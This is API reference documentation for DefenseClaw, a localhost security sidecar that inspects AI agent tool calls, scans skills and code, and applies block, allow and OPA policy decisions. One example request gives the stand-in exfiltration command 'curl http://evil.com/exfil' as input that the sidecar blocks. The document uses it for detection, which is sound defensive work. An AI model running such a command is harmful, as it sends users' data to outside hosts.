# DefenseClaw Sidecar REST API

The sidecar exposes a localhost-only REST API on `127.0.0.1:{gateway.api_port}`
(default `18790`). All responses are `application/json`. Mutating requests
(POST, PUT, PATCH, DELETE) require the `X-DefenseClaw-Client` header and
`Content-Type: application/json` (CSRF protection).

Source: `internal/gateway/api.go`, `internal/gateway/inspect.go`

---

## Endpoint Summary

| Endpoint | Method | Purpose | Callers |
|----------|--------|---------|---------|
| `/health` | GET | Sidecar health check | Python CLI (`gateway.py`, `cmd_status.py`, `cmd_init.py`, `cmd_doctor.py`), Go CLI (`sidecar.go`) |
| `/status` | GET | Full sidecar status + gateway hello | TS plugin (`DaemonClient.status()` in `client.ts`), Python CLI (`OrchestratorClient.status()` in `gateway.py`) — no CLI command calls it directly |
| `/api/v1/inspect/tool` | POST | **Inspect tool call before execution** | OpenClaw plugin `before_tool_call` hook (`index.ts`) |
| `/api/v1/scan/code` | POST | **Run CodeGuard scanner on a file/directory** | TS plugin `runCodeScan()` (`enforcer.ts`), CodeGuard skill (`main.py`) |
| `/v1/guardrail/event` | POST | Receive verdict telemetry from guardrail proxy | Optional HTTP path; built-in proxy logs via `recordTelemetry()` in `proxy.go` |
| `/v1/guardrail/evaluate` | POST | OPA policy evaluation for guardrail verdicts | Optional HTTP path; built-in proxy uses in-process OPA in `guardrail.go` |
| `/v1/guardrail/config` | GET/PATCH | Read/update guardrail mode at runtime | No production callers |
| `/enforce/block` | POST/DELETE | Add/remove block list entries | TS plugin `/block` command (`index.ts`, `enforcer.ts`, `client.ts`) |
| `/enforce/allow` | POST | Add allow list entries | TS plugin `/allow` command (`index.ts`, `enforcer.ts`, `client.ts`) |
| `/enforce/blocked` | GET | List all blocked entries | TS plugin `syncFromDaemon()` (`enforcer.ts`) |
| `/enforce/allowed` | GET | List all allowed entries | TS plugin `syncFromDaemon()` (`enforcer.ts`) |
| `/policy/evaluate` | POST | Admission gate evaluation (block→allow→scan) | TS plugin `evaluateViaOPA()` (`enforcer.ts`) |
| `/policy/evaluate/firewall` | POST | OPA firewall policy evaluation | No production callers |
| `/policy/evaluate/sandbox` | POST | OPA sandbox policy evaluation | No production callers |
| `/policy/evaluate/audit` | POST | OPA audit retention policy evaluation | No production callers |
| `/policy/evaluate/skill-actions` | POST | OPA skill-actions policy evaluation | No production callers |
| `/policy/reload` | POST | Reload OPA policy engine from disk | No production callers |
| `/scan/result` | POST | Store scan result in audit log | TS plugin (`enforcer.ts`, `client.ts`) |
| `/v1/skill/scan` | POST | Run skill scanner on a local path | Python CLI (`gateway.py`, `cmd_skill.py`) |
| `/v1/mcp/scan` | POST | Run MCP scanner on a local path | No production callers |
| `/v1/skill/fetch` | POST | Stream skill directory as tar.gz | No production callers |
| `/skill/disable` | POST | Disable skill via OpenClaw WS | Python CLI (`cmd_skill.py`), sidecar watcher |
| `/skill/enable` | POST | Enable skill via OpenClaw WS | Python CLI (`cmd_skill.py`) |
| `/plugin/disable` | POST | Disable plugin via OpenClaw WS | Python CLI (`cmd_plugin.py`) |
| `/plugin/enable` | POST | Enable plugin via OpenClaw WS | Python CLI (`cmd_plugin.py`) |
| `/config/patch` | POST | Patch OpenClaw config via WS | No production callers |
| `/skills` | GET | List skills from OpenClaw | Python CLI (`cmd_skill.py`) |
| `/mcps` | GET | List MCP servers from config dirs | TS plugin (`DaemonClient.listMCPs()` in `client.ts`) — no CLI command calls it directly |
| `/tools/catalog` | GET | Tool catalog from OpenClaw | No production callers |
| `/alerts` | GET | Recent alerts from audit store | TS plugin (`DaemonClient.listAlerts()` in `client.ts`) — TUI uses SQLite directly |
| `/audit/event` | POST | Log arbitrary audit event | TS plugin (`enforcer.ts`, `client.ts`) |

---

## Table of Contents

- [Health & Status](#health--status)
- [Tool Inspection](#tool-inspection)
- [Guardrail](#guardrail)
- [Enforcement (Block/Allow)](#enforcement-blockallow)
- [Admission Policy](#admission-policy)
- [Policy Domains (OPA)](#policy-domains-opa)
- [Scanning](#scanning)
- [Gateway Operations](#gateway-operations)
- [Audit](#audit)

---

## Health & Status

### GET /health

Returns the subsystem health snapshot (gateway, watcher, API, guardrail
states + uptime).

**Callers:**
- Python CLI: `OrchestratorClient.health()` / `is_running()` in `cli/defenseclaw/gateway.py`
- `defenseclaw status` command (`cli/defenseclaw/commands/cmd_status.py`) via `is_running()`
- `defenseclaw init` command (`cli/defenseclaw/commands/cmd_init.py`) via `_check_sidecar_health()`
- `defenseclaw doctor` command (`cli/defenseclaw/commands/cmd_doctor.py`) via `_check_sidecar()`
- Go CLI: `internal/cli/sidecar.go` for sidecar health probe

**Response:**

```json
{
  "gateway":  { "state": "running", "since": "...", "error": "" },
  "watcher":  { "state": "disabled", "since": "...", "error": "" },
  "api":      { "state": "running", "since": "...", "error": "" },
  "guardrail": { "state": "running", "since": "...", "error": "" },
  "uptime_s": 3600
}
```

### GET /status

Returns the health snapshot plus the gateway hello payload (protocol
version, features, auth) if connected.

**Callers:**
- TS plugin: `DaemonClient.status()` in `extensions/defenseclaw/src/client.ts`
- Python CLI: `OrchestratorClient.status()` in `cli/defenseclaw/gateway.py`

No production CLI command calls this directly.

**Response:**

```json
{
  "health": { "..." },
  "gateway_hello": { "protocol": "v3", "features": ["..."] }
}
```

---

## Tool Inspection

### POST /api/v1/inspect/tool

Unified inspection endpoint for the OpenClaw plugin's `before_tool_call`
hook. Called before every tool invocation to determine whether the call
should be allowed, alerted on, or blocked.

The handler branches on the `tool` field:

- **`message` tool** (with `content` or `direction: "outbound"`): scans
  the outbound message body for secrets, PII, and exfiltration patterns
  via `inspectMessageContent()`.
- **All other tools**: checks the tool name + args against dangerous
  command patterns, sensitive path access, and secrets in arguments via
  `inspectToolPolicy()`.

**Callers:**
- OpenClaw plugin: `before_tool_call` hook in `extensions/defenseclaw/src/index.ts`
  calls `inspectTool()` which POSTs to this endpoint via `fetch()`.

**Code flow:**

```
OpenClaw agent invokes a tool
  → plugin before_tool_call hook fires
    → index.ts inspectTool() POST /api/v1/inspect/tool
      → api.go handleInspectTool()
        → inspect.go inspectToolPolicy() or inspectMessageContent()
          → pattern matching against dangerousPatterns, secretPatterns, exfilPatterns
        → audit log via logger.LogAction()
      → returns verdict JSON
    → plugin cancels tool call if action=block and mode=action
```

**Request:**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `tool` | string | yes | Tool name (`shell`, `write_file`, `message`, etc.) |
| `args` | object | no | Tool arguments as passed by OpenClaw |
| `content` | string | no | Message body (for `message` tool) |
| `direction` | string | no | `"outbound"` triggers message content inspection |

```json
{
  "tool": "shell",
  "args": { "command": "curl http://evil.com/exfil" }
}
```

**Response:**

| Field | Values | Description |
|-------|--------|-------------|
| `action` | `allow`, `alert`, `block` | Recommended action |
| `severity` | `NONE`, `LOW`, `MEDIUM`, `HIGH`, `CRITICAL` | Highest finding severity |
| `reason` | string | Human-readable explanation |
| `findings` | string[] | All matched patterns |
| `mode` | `observe`, `action` | Current guardrail mode from config |

```json
{
  "action": "block",
  "severity": "HIGH",
  "reason": "matched: dangerous-cmd:curl",
  "findings": ["dangerous-cmd:curl"],
  "mode": "action"
}
```

In **observe** mode the plugin logs the verdict but never cancels the
tool call. In **action** mode the plugin calls `event.cancel()` when
`action` is `"block"`.

#### PII Redaction & `X-DefenseClaw-Reveal-PII`

By default the response body redacts PII / secret material from every
`detailed_findings[].evidence` field (masked to a shape-preserving
placeholder such as `<redacted-api-key hash=a1b2...>`), so operator
dashboards and debug traces can safely store `/inspect` responses.

For interactive debugging where the caller needs the raw matched bytes,
send `X-DefenseClaw-Reveal-PII: 1`. The handler audit-logs an
`inspect-reveal` event with the caller identity and only then returns
the unmasked evidence. The header is strict: any value other than the
literal string `"1"` is ignored and evidence stays redacted.

The reveal flag is scoped to the HTTP response only. Persistent sinks
(SQLite audit, webhooks, OpenTelemetry logs, Splunk HEC) always use the
redacted copy regardless of the header.

Source: `internal/gateway/inspect.go`

---

## Guardrail

These endpoints support guardrail telemetry and OPA evaluation. The **built-in**
Go guardrail proxy (`internal/gateway/proxy.go`, `internal/gateway/guardrail.go`)
writes inspection results to the audit store and OTel **in-process** via
`recordTelemetry()`; it does not require HTTP calls to these routes for normal
operation. `POST /v1/guardrail/event` remains available for external or
programmatic callers that want the same logging path.

### POST /v1/guardrail/event

Receives verdict telemetry after each LLM prompt or completion inspection (same
fields the built-in proxy records directly). Logs to audit store and records OTel
metrics.

**Callers:**
- **Built-in path:** `GuardrailProxy.recordTelemetry()` in `internal/gateway/proxy.go`
  after `GuardrailInspector.Inspect()` in `internal/gateway/guardrail.go` (no HTTP hop).
- **HTTP path:** any client that POSTs the JSON schema below (tests, integrations).

**Code flow (built-in):**

```
LLM request/response flows through GuardrailProxy (proxy.go)
  → GuardrailInspector.Inspect() (guardrail.go): local / Cisco / judge / OPA
  → recordTelemetry() (proxy.go)
    → audit store: LogEvent() + LogAction()
    → OTel: RecordGuardrailEvaluation() + RecordGuardrailLatency()
```

**Code flow (HTTP caller):**

```
POST /v1/guardrail/event
  → api.go handleGuardrailEvent()
    → audit store + OTel (same as above)
```

**Request:**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `direction` | string | yes | `"prompt"` or `"completion"` |
| `model` | string | no | Model name (e.g. `claude-opus-4-5`) |
| `action` | string | yes | `"allow"`, `"alert"`, or `"block"` |
| `severity` | string | yes | `"NONE"`, `"MEDIUM"`, `"HIGH"`, etc. |
| `reason` | string | no | Human-readable explanation |
| `findings` | string[] | no | Matched pattern names |
| `elapsed_ms` | number | no | Inspection duration |
| `tokens_in` | number | no | Input token count |
| `tokens_out` | number | no | Output token count |

### POST /v1/guardrail/evaluate

Evaluates guardrail scan results against the OPA policy engine (or
built-in fallback). Returns the final action/severity decision.

**Callers:**
- **Built-in path:** `GuardrailInspector.finalize()` in `internal/gateway/guardrail.go`
  calls `policy.Engine.EvaluateGuardrail()` in-process (no HTTP hop).
- **HTTP path:** `POST /v1/guardrail/evaluate` for tests or external tools.

**Code flow (built-in):**

```
GuardrailInspector.Inspect() / finalize() (guardrail.go)
  → local + Cisco + judge merge
  → policy.New(policyDir).EvaluateGuardrail() (OPA, in-process)
  → returns ScanVerdict to proxy
```

**Code flow (HTTP caller):**

```
POST /v1/guardrail/evaluate
  → api.go handleGuardrailEvaluate()
    → policy.New(policyDir).EvaluateGuardrail() (OPA)
    → fallback: built-in severity ranking if OPA unavailable
    → audit store: LogEvent() + LogAction()
    → OTel: RecordGuardrailEvaluation()
  → returns GuardrailOutput JSON
```

**Request:**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `direction` | string | yes | `"prompt"` or `"completion"` |
| `model` | string | no | Model name |
| `mode` | string | yes | `"observe"` or `"action"` |
| `scanner_mode` | string | no | `"local"`, `"remote"`, `"both"` |
| `local_result` | object | no | `{ severity, action, findings }` |
| `cisco_result` | object | no | `{ severity, action, findings }` |
| `content_length` | number | no | Content length in chars |
| `elapsed_ms` | number | no | Inspection duration |

**Response:**

```json
{
  "action": "alert",
  "severity": "MEDIUM",
  "reason": "built-in fallback (OPA unavailable)",
  "scanner_sources": ["scanner"]
}
```

### GET/PATCH /v1/guardrail/config

Read or update guardrail runtime configuration (mode and scanner_mode).
Changes are persisted to `~/.defenseclaw/guardrail_runtime.json` and
take effect immediately without restarting the sidecar.

**Callers:** No production callers currently. Available for runtime
toggling between observe and action mode.

**GET response:**

```json
{
  "mode": "observe",
  "scanner_mode": "local"
}
```

**PATCH request:**

```json
{
  "mode": "action",
  "scanner_mode": "both"
}
```

---

## Enforcement (Block/Allow)

### POST /enforce/block

Add an entry to the block list. Returns `{"status": "blocked"}`.

### DELETE /enforce/block

Remove an entry from the block list. Returns `{"status": "unblocked"}`.

**Callers:**
- TS plugin: `DaemonClient.block()` / `unblock()` in `client.ts`
- TS plugin: `PolicyEnforcer.block()` in `policy/enforcer.ts`
- OpenClaw `/block` slash command in `index.ts`

**Request:**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `target_type` | string | yes | `"skill"`, `"mcp"`, or `"plugin"` |
| `target_name` | string | yes | Name of the target |
| `reason` | string | no | Reason for blocking (default: `"blocked via REST API"`) |

### POST /enforce/allow

Add an entry to the allow list. Returns `{"status": "allowed"}`.

**Callers:**
- TS plugin: `DaemonClient.allow()` in `client.ts`
- TS plugin: `PolicyEnforcer.allow()` in `policy/enforcer.ts`
- OpenClaw `/allow` slash command in `index.ts`

**Request:** Same schema as `/enforce/block`.

### GET /enforce/blocked

List all block list entries.

**Callers:**
- TS plugin: `DaemonClient.listBlocked()` — used by `PolicyEnforcer.syncFromDaemon()`

**Response:**

```json
[
  {
    "id": "...",
    "target_type": "skill",
    "target_name": "malicious-skill",
    "reason": "known malware",
    "updated_at": "2026-03-24T12:00:00Z"
  }
]
```

### GET /enforce/allowed

List all allow list entries. Same response shape as `/enforce/blocked`.

**Callers:**
- TS plugin: `DaemonClient.listAllowed()` — used by `PolicyEnforcer.syncFromDaemon()`

---

## Admission Policy

### POST /policy/evaluate

Evaluate an admission decision against the OPA policy engine (or
built-in fallback). Implements the admission gate flow:
block list → allow list → scan → verdict.

**Callers:**
- TS plugin: `DaemonClient.evaluatePolicy()` in `client.ts`
- TS plugin: `PolicyEnforcer.evaluateViaOPA()` in `policy/enforcer.ts`

**Code flow:**

```
PolicyEnforcer.evaluateSkill() / evaluateMCPServer() / evaluatePlugin()
  → evaluateViaOPA() POST /policy/evaluate
    → api.go handlePolicyEvaluate()
      → policy.New(policyDir).Evaluate() (OPA)
      → fallback: built-in block→allow→scan→severity gate
    → returns AdmissionOutput JSON
```

**Request:**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `domain` | string | no | `"admission"` (default) |
| `input.target_type` | string | yes | `"skill"`, `"mcp"`, or `"plugin"` |
| `input.target_name` | string | yes | Name of the target |
| `input.path` | string | no | Filesystem path |
| `input.scan_result` | object | no | `{ max_severity, total_findings }` |

**Response:**

```json
{
  "ok": true,
  "data": {
    "verdict": "rejected",
    "reason": "max severity HIGH triggers block"
  }
}
```

---

## Policy Domains (OPA)

These endpoints evaluate inputs against specific OPA policy domains.
They share the same pattern: load the policy engine from
`scannerCfg.PolicyDir`, evaluate the domain-specific input, and return
the policy output. All return `503` if the policy engine cannot be
loaded and `500` if evaluation fails.

Source: `internal/gateway/api.go`, `internal/policy/types.go`

### POST /policy/evaluate/firewall

Evaluate a network destination against firewall policy rules.

**Callers:** No production callers currently. Available for
programmatic firewall policy checks.

**Request:**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `target_type` | string | no | Target type label |
| `destination` | string | yes | Network destination (hostname or IP) |
| `port` | int | no | Destination port |
| `protocol` | string | no | Protocol (`tcp`, `udp`, etc.) |

```json
{
  "destination": "evil.example.com",
  "port": 443,
  "protocol": "tcp"
}
```

**Response:**

```json
{
  "action": "block",
  "rule_name": "deny-untrusted-hosts"
}
```

### POST /policy/evaluate/sandbox

Evaluate a skill's requested endpoints and permissions against sandbox
policy rules.

**Callers:** No production callers currently. Available for
programmatic sandbox policy checks.

**Request:**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `skill_name` | string | yes | Name of the skill |
| `requested_endpoints` | string[] | no | Network endpoints the skill wants to access |
| `requested_permissions` | string[] | no | OS permissions the skill wants |

```json
{
  "skill_name": "web-search",
  "requested_endpoints": ["https://api.example.com"],
  "requested_permissions": ["network", "filesystem"]
}
```

**Response:**

```json
{
  "allowed_endpoints": ["https://api.example.com"],
  "denied_endpoints": [],
  "denied_from_request": [],
  "permissions": ["network"],
  "allowed_skills": ["web-search"]
}
```

### POST /policy/evaluate/audit

Evaluate an audit event against retention and export policy rules.

**Callers:** No production callers currently. Available for
programmatic audit policy checks.

**Request:**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `event_type` | string | no | Type of audit event |
| `severity` | string | no | Event severity |
| `age_days` | int | no | Age of the event in days |
| `export_targets` | string[] | no | Candidate export destinations |

```json
{
  "event_type": "scan.complete",
  "severity": "HIGH",
  "age_days": 30,
  "export_targets": ["splunk"]
}
```

**Response:**

```json
{
  "retain": true,
  "retain_reason": "severity HIGH within retention window",
  "export_to": ["splunk"]
}
```

### POST /policy/evaluate/skill-actions

Evaluate what runtime, file, and install actions should apply for a
given severity level. Used to determine enforcement behavior.

**Callers:** No production callers currently. Available for
programmatic skill-action policy lookups.

**Request:**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `severity` | string | yes | Severity level (`LOW`, `MEDIUM`, `HIGH`, `CRITICAL`) |
| `target_type` | string | no | Target type (`skill`, `mcp`, `plugin`) |

```json
{
  "severity": "HIGH",
  "target_type": "skill"
}
```

**Response:**

```json
{
  "runtime_action": "disable",
  "file_action": "quarantine",
  "install_action": "block",
  "should_block": true
}
```

### POST /policy/reload

Hot-reload the OPA policy engine from the configured `policy_dir`.
Re-reads all `.rego` files and `data.json` from disk, compiles the
modules, and atomically swaps the in-memory store used by **both** the
REST API policy-evaluation endpoints and the install watcher's
admission gate.  If compilation fails the previous engine state is
preserved and an error is returned.

Use this after editing Rego policy files on disk to pick up changes
without restarting the sidecar.

> **Note:** This endpoint reloads _OPA Rego policies_, not the YAML
> config file (`~/.defenseclaw/config.yaml`).  The `watch:` section
> inside policy YAML templates (`policies/default.yaml` etc.) controls
> rescan/drift-detection settings — it does **not** enable automatic
> filesystem watching of policy files themselves.

**Callers:** CLI `policy reload`, or any HTTP client.

**Request:** No request body.

**Response:**

```json
{
  "status": "reloaded",
  "policy_dir": "/Users/you/.defenseclaw/policies"
}
```

**Errors:** `503` if `policy_dir` is not configured, `500` if engine
reload fails (disk read or compilation error).

---

## Scanning

### POST /scan/result

Store a scan result in the audit log. Used by the TS plugin after
scanning skills/plugins/MCP configs.

**Callers:**
- TS plugin: `DaemonClient.submitScanResult()` in `client.ts`
- TS plugin: `PolicyEnforcer` after admission scans in `policy/enforcer.ts`

**Request:** A full `ScanResult` JSON object (scanner, target, timestamp,
findings array).

### POST /v1/skill/scan

Run the Python `skill-scanner` CLI on a local directory path. Returns
the scan result.

**Callers:**
- Python CLI: `OrchestratorClient.scan_skill()` in `cli/defenseclaw/gateway.py`
- `defenseclaw scan` command with `--remote` flag in `cli/defenseclaw/commands/cmd_skill.py`

**Code flow:**

```
defenseclaw scan /path/to/skill --remote
  → cmd_skill.py POST /v1/skill/scan
    → api.go handleSkillScan()
      → scanner.NewSkillScanner().Scan() (shells out to Python skill-scanner)
      → audit: LogAction() + LogScanWithVerdict()
    → returns ScanResult JSON
```

**Request:**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `target` | string | yes | Absolute path to skill directory |
| `name` | string | no | Skill name (for logging) |

### POST /v1/mcp/scan

Run the Python `mcp-scanner` CLI on a local directory path. Returns
the scan result. Analogous to `/v1/skill/scan` but for MCP server
configs.

**Callers:** No production callers currently. Available for
programmatic MCP config scanning.

**Request:**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `target` | string | yes | Absolute path to MCP config directory |
| `name` | string | no | MCP server name (for logging) |

```json
{
  "target": "/Users/you/.openclaw/mcp/my-server",
  "name": "my-server"
}
```

**Response:** Same `ScanResult` JSON as `/v1/skill/scan`.

Source: `internal/gateway/api.go` (`handleMCPScan`)

### POST /api/v1/scan/code

Run the CodeGuard scanner (built-in regex rule engine) on a file or
directory. Returns findings for secrets, dangerous patterns, and code
quality issues.

**Callers:**
- TS plugin: `runCodeScan()` in `extensions/defenseclaw/src/policy/enforcer.ts`
- CodeGuard skill: `_scan_via_sidecar()` in `cli/defenseclaw/_data/skills/codeguard/main.py`

**Code flow:**

```
TS plugin or CodeGuard skill
  → POST /api/v1/scan/code { "path": "/some/file.py" }
    → api.go handleCodeScan()
      → scanner.NewCodeGuardScanner(rulesDir).Scan(ctx, path)
      → optional audit: LogScan()
    → returns ScanResult JSON
```

**Request:**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `path` | string | yes | Absolute path to file or directory to scan |

```json
{
  "path": "/Users/you/project/src/app.py"
}
```

**Response:** Same `ScanResult` JSON as `/v1/skill/scan`.

Source: `internal/gateway/api.go` (`handleCodeScan`)

### POST /v1/skill/fetch

Stream a skill directory as a `tar.gz` archive. Intended for remote
scan workflows where the scanner runs on a different host.

**Callers:** No production callers currently. Reserved for future
remote deployment scenarios.

**Request:**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `target` | string | yes | Absolute path to skill directory |

**Response:** Binary `application/gzip` stream.

---

## Gateway Operations

These endpoints proxy commands through the WebSocket connection to the
OpenClaw gateway. They return `503 Service Unavailable` if the gateway
is not connected, or `502 Bad Gateway` if the gateway rejects the RPC.

### POST /skill/disable

Disable a skill at the OpenClaw gateway.

**Callers:**
- Python CLI: `OrchestratorClient.disable_skill()` in `cli/defenseclaw/gateway.py`
- `defenseclaw skill disable` command in `cli/defenseclaw/commands/cmd_skill.py`
- Sidecar watcher: auto-disables skills that fail admission (`sidecar.go`)

**Request:**

```json
{ "skillKey": "my-skill-name" }
```

### POST /skill/enable

Enable a previously disabled skill at the OpenClaw gateway.

**Callers:**
- Python CLI: `OrchestratorClient.enable_skill()` in `cli/defenseclaw/gateway.py`
- `defenseclaw skill enable` command in `cli/defenseclaw/commands/cmd_skill.py`

**Request:**

```json
{ "skillKey": "my-skill-name" }
```

### POST /plugin/disable

Disable a plugin at the OpenClaw gateway via WebSocket RPC.

**Callers:**
- Python CLI: `OrchestratorClient.disable_plugin()` in `cli/defenseclaw/gateway.py`
- `defenseclaw plugin disable` command in `cli/defenseclaw/commands/cmd_plugin.py`

**Request:**

```json
{ "pluginName": "my-plugin" }
```

**Response:**

```json
{ "status": "disabled", "pluginName": "my-plugin" }
```

### POST /plugin/enable

Enable a previously disabled plugin at the OpenClaw gateway via
WebSocket RPC.

**Callers:**
- Python CLI: `OrchestratorClient.enable_plugin()` in `cli/defenseclaw/gateway.py`
- `defenseclaw plugin enable` command in `cli/defenseclaw/commands/cmd_plugin.py`

**Request:**

```json
{ "pluginName": "my-plugin" }
```

**Response:**

```json
{ "status": "enabled", "pluginName": "my-plugin" }
```

### POST /config/patch

Patch an OpenClaw gateway config value via the WebSocket RPC.

**Callers:** Client method exists (`OrchestratorClient.patch_config()`)
but no production command calls it directly.

**Request:**

```json
{ "path": "agent.model", "value": "defenseclaw/claude-opus-4-5" }
```

### GET /skills

List skills from the OpenClaw gateway via WebSocket RPC.

**Callers:**
- Python CLI: `OrchestratorClient.list_skills()` in `cli/defenseclaw/gateway.py`
- `defenseclaw skill list` command in `cli/defenseclaw/commands/cmd_skill.py`

### GET /mcps

List MCP server names discovered from the configured MCP directories.
Does not query the gateway — reads the filesystem directly.

**Callers:** Client method exists (`DaemonClient.listMCPs()`) but no
production code calls it.

### GET /tools/catalog

Fetch the runtime tool catalog with provenance from the OpenClaw
gateway via WebSocket RPC.

**Callers:** Client method exists (`OrchestratorClient.get_tools_catalog()`)
but no production command calls it directly.

---

## Audit

### POST /audit/event

Log an arbitrary audit event to the SQLite store.

**Callers:**
- TS plugin: `DaemonClient.logEvent()` in `client.ts`
- TS plugin: `PolicyEnforcer.reportToDaemon()` posts admission outcomes
  in `policy/enforcer.ts`

**Request:**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `action` | string | yes | Event action (e.g. `"skill.install"`, `"scan.complete"`) |
| `target` | string | no | Target path or name |
| `actor` | string | no | Who triggered the event |
| `severity` | string | no | `"INFO"`, `"MEDIUM"`, `"HIGH"` (default: `"INFO"`) |
| `details` | string | no | JSON or freeform details |

### GET /alerts

List recent alerts from the audit store, ordered by most recent.

**Callers:**
- TS plugin: `DaemonClient.listAlerts()` in `client.ts`

The TUI and CLI access the SQLite audit store directly via the Go
`audit.Store` package rather than this HTTP endpoint.

**Query params:**

| Param | Type | Default | Description |
|-------|------|---------|-------------|
| `limit` | int | 50 | Maximum number of alerts to return |

---

## CSRF Protection

All mutating requests (POST, PUT, PATCH, DELETE) are protected by:

1. **`X-DefenseClaw-Client` header** — must be present (any value). Blocks
   simple/no-cors browser requests.
2. **`Content-Type: application/json`** — required for all request bodies.
3. **Origin validation** — if an `Origin` header is present, it must be a
   localhost address (`127.0.0.1`, `localhost`, `[::1]`).

GET, HEAD, and OPTIONS requests are exempt.

Source: `csrfProtect()` in `internal/gateway/api.go`

---

## Error Responses

All error responses follow the same shape:

```json
{ "error": "descriptive error message" }
```

| Status | Meaning |
|--------|---------|
| 400 | Invalid request body or missing required fields |
| 403 | Missing CSRF header or non-localhost origin |
| 405 | Wrong HTTP method |
| 415 | Content-Type is not `application/json` |
| 500 | Internal error (audit store, scanner, policy engine) |
| 502 | Gateway rejected the proxied RPC |
| 503 | Service unavailable (gateway not connected, store not configured) |
